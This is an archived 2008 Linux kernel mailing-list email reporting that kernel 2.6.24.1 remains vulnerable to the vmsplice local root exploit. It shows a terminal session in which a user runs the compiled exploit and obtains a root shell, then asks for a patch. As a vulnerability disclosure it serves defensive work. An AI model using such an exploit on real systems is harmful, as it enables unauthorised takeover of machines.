Return-Path: <linux-kernel-owner+w=401wt.eu-S1755135AbYBJGEp@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1755135AbYBJGEp (ORCPT <rfc822;w@1wt.eu>);
	Sun, 10 Feb 2008 01:04:45 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751849AbYBJGEh
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Sun, 10 Feb 2008 01:04:37 -0500
Received: from rv-out-0910.google.com ([209.85.198.189]:9574 "EHLO
	rv-out-0910.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1751515AbYBJGEg (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Sun, 10 Feb 2008 01:04:36 -0500
DomainKey-Signature: a=rsa-sha1; c=nofws;
        d=gmail.com; s=gamma;
        h=message-id:date:from:to:subject:mime-version:content-type:content-transfer-encoding:content-disposition;
        b=upCU8UKUKLFSmKOVrajqS9NOpHve3kxnNWtR5ouoDDec+ttbd+61ihRKcZCYIiYxPAsPi5/RXM64x11VBrBx/EDqZUlb2slYNb0Ee9YrPwJiwFHBSYCFfkCX2VsKakZ5RZ+HrPYdOAbsoJCtmqU/hV/VLSYlv/b3F6cyiLFFteQ=
Message-ID: <2e77fc10802092204t7764ff12s65304f70500e2090@mail.gmail.com>
Date: Sun, 10 Feb 2008 08:04:35 +0200
From: "Niki Denev" <ndenev@gmail.com>
To: linux-kernel@vger.kernel.org
Subject: kernel 2.6.24.1 still vulnerable to the vmsplice local root exploit
MIME-Version: 1.0
Content-Type: text/plain; charset=ISO-8859-1
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Hi,

As the subject says the 2.6.24.1 is still vulnerable to the vmsplice
local root exploit.

[opa@test tmp]$ uname -a
Linux tester 2.6.24.1 #1 Sun Feb 10 00:06:49 EST 2008 i686 unknown
[opa@test tmp]$ ./vms

-----------------------------------
 Linux vmsplice Local Root Exploit
 By qaaz
-----------------------------------
[+] mmap: 0x0 .. 0x1000
[+] page: 0x0
[+] page: 0x20
[+] mmap: 0x4000 .. 0x5000
[+] page: 0x4000
[+] page: 0x4020
[+] mmap: 0x1000 .. 0x2000
[+] page: 0x1000
[+] mmap: 0xb7f56000 .. 0xb7f88000
[+] root
[root@test tmp]#
[root@test tmp]# id
uid=0(root) gid=0(root) groups=2033(opa)
[root@test tmp]# uname -a
Linux test 2.6.24.1 #1 Sun Feb 10 00:06:49 EST 2008 i686 unknown

Is there any known fix/patch for this?
